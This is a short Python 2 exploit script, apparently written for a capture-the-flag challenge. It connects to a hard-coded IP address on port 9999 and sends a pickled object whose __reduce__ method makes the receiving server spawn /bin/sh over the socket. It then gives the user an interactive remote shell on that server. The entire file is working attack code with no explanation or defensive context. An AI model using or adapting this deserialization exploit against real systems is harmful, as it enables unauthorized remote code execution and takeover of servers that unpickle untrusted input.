#!/usr/bin/python

import socket
import subprocess
import cPickle
import time

target_home = "13.124.212.93"
target_port = 9999

class Exploit(object):
    def __reduce__(self):
        fd = 4
        return (subprocess.Popen, (('/bin/sh',),0,None,fd,fd,fd))

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
client.connect((target_home, target_port))

data = cPickle.dumps(Exploit())
#print data
client.send(data)
time.sleep(1)

while 1==1:
    line = raw_input()
    client.send(line + "\n")
    response = client.recv(4096)
    print response
